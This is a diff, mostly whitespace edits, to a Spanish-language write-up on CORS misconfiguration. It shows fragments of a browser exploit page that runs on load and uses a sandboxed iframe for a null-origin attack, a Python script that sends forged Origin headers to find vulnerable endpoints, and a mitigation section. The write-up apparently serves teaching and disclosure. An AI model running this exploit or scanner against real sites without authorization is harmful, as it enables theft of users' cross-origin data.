@@ -152,7 +152,7 @@ Origin: null
                 exploitWithNullOrigin();
             });
         }
-    
+  
         function exploitWithNullOrigin() {
             // Crear iframe sandbox para origen null
             const iframe = document.createElement('iframe');
@@ -170,7 +170,7 @@ Origin: null
             `;
             document.body.appendChild(iframe);
         }
-    
+  
         // Ejecutar exploit cuando se carga la página
         document.addEventListener('DOMContentLoaded', exploitCORS);
     </script>
@@ -202,32 +202,32 @@ def test_cors_vulnerability(target_url, test_origins=None):
   
     for origin in test_origins:
         headers = {'Origin': origin}
-    
+  
         try:
             response = requests.get(target_url, headers=headers, timeout=10)
-        
+      
             # Verificar respuesta CORS
             acao = response.headers.get('Access-Control-Allow-Origin', '')
             acac = response.headers.get('Access-Control-Allow-Credentials', '')
-        
+      
             is_vulnerable = False
             vulnerability_type = ""
-        
+      
             # Verificar reflexión de origen
             if acao == origin:
                 is_vulnerable = True
                 vulnerability_type = "Origin Reflection"
-        
+      
             # Verificar wildcard con credenciales
             elif acao == '*' and acac.lower() == 'true':
                 is_vulnerable = True 
                 vulnerability_type = "Wildcard with Credentials"
-        
+      
             # Verificar wildcard sin credenciales pero con datos sensibles
             elif acao == '*' and 'token' in response.text.lower():
                 is_vulnerable = True
                 vulnerability_type = "Wildcard with Sensitive Data"
-        
+      
             if is_vulnerable:
                 vulnerable_endpoints.append({
                     'url': target_url,
@@ -242,7 +242,7 @@ def test_cors_vulnerability(target_url, test_origins=None):
                 print(f"    Type: {vulnerability_type}")
                 print(f"    ACAO: {acao}")
                 print(f"    ACAC: {acac}\n")
-            
+          
         except requests.RequestException as e:
             print(f"[-] Error testing {target_url} with origin {origin}: {e}")
   
@@ -476,10 +476,6 @@ La aplicación permite acceso cross-origin no autorizado a recursos sensibles me
 ### Mitigación Recomendada
 
 Implementar whitelist estricta de orígenes permitidos, eliminar reflexión dinámica del header `Origin`, y verificar que `Access-Control-Allow-Credentials: true` solo se use con orígenes específicos pre-aprobados.
-
-]</span>
-
-<div style="text-align: center">Vulnerabilidad de Intercambio de Recursos de Origen Cruzado (CORS)</div>
 
 
 [^1]: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
